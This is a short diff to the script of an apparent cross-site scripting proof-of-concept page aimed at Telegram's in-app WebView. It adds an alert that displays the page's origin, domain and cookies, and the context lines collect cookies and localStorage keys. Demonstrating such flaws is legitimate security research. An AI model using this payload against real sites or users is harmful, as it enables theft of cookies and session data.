@@ -28,6 +28,9 @@
 </div>
 <script>
 function xssProof() {
+  // Pop alert XSS proof
+  try { alert('XSS in Telegram WebView\n\nOrigin: ' + location.origin + '\nDomain: ' + document.domain + '\nCookies: ' + (document.cookie || 'none')); } catch(e) {}
+
   // Collect accessible data
   var cookies = document.cookie || '(none)';
   var lsKeys = [];
